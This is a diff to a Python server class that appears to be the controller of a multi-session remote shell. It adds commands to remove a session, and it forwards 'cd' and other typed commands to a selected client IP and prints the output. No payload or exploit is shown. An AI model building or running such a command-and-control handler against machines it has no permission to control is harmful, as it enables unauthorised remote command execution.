@@ -39,6 +39,39 @@ class Server:
         self.stop_event = threading.Event()
         self.byt = 1024 * 10
 
+    # REMOVE SESSION
+    def remove_Session(self):
+        try:
+            self.show_Sessions()
+            ip = (input("[+] -1 to exit please enter the IP:")).strip()
+            if ip == "-1":
+                print(f"[+] Operation cancelled")
+                return
+            if self.ip_to_socket_map.get(ip) == None:
+                raise Exception("IP does not exist")
+
+            clientsocket = self.ip_to_socket_map[ip]
+            # check if there are other avaiable sessions if not we stop the handleclient thread execution
+            if len(self.ip_to_socket_map) == 1 and ip == self.current_Client:
+                # remove the sockets and empty the thread
+                print(f"[+] Connection closed with {ip} ")
+                clientsocket.close()
+                self.control_Thread = None
+                self.current_Client = None
+                self.ip_to_socket_map.pop(ip)
+                logterminal.write(f"[+] NO ACTIVE SESSIONS")
+                print_thread_count()
+            else:
+                print(f"[+] Connection closed with {ip} ")
+                clientsocket.close()
+                self.ip_to_socket_map.pop(ip)
+                for ip in self.ip_to_socket_map:
+                    self.current_Client = ip
+                    return
+
+        except Exception as ex:
+            print(f"[-]Remove Error :{str(ex)}")
+
     # MUJI HANDLE CLIENT
     def handle_Clients(self):
         global exit_flag
@@ -68,7 +101,10 @@ class Server:
                 if command.lower() == "clear":
                     os.system("powershell clear")
                     continue
-
+                # command to remove session
+                if command.lower() == "remove session":
+                    self.remove_Session()
+                    continue
                 # quit the whole application
                 if command.lower() == "quit":
                     self.broad_Cast(command.lower())
@@ -79,6 +115,18 @@ class Server:
                 # this check of any other thread existence has exit flag
                 if exit_flag == True:
                     break
+                # change directory
+                if command.lower()[:3] == "cd ":
+                    self.send_Message(
+                        self.ip_to_socket_map[self.current_Client],
+                        command,
+                        self.current_Client,
+                    )
+                    result = self.receive_Message(
+                        self.ip_to_socket_map[self.current_Client]
+                    )
+                    print(result)
+                    continue
 
                 # switch session
                 if (
@@ -93,7 +141,10 @@ class Server:
                     command,
                     self.current_Client,
                 )
-
+                result = self.receive_Message(
+                    self.ip_to_socket_map[self.current_Client]
+                )
+                print(result)
             except Exception as ex:
                 logterminal.write(
                     f"[+] SOMETHING WENT WRONG IN HANDLE CLIENT COMMUNICATION {str(ex)}"
@@ -150,10 +201,10 @@ class Server:
             logterminal.write(
                 f"[-]SOMETHING WENT WRONG WHILE SENDING MESSAGE :{str(ex)}"
             )
+
             # remove the existing client if the communication has failed
             if self.ip_to_socket_map.get(current_clientip) != None:
                 self.ip_to_socket_map.pop(current_clientip)
-
             # check if there are other avaiable sessions if not we stop the handleclient thread execution
             if len(self.ip_to_socket_map) == 0:
                 # remove the sockets and empty the thread
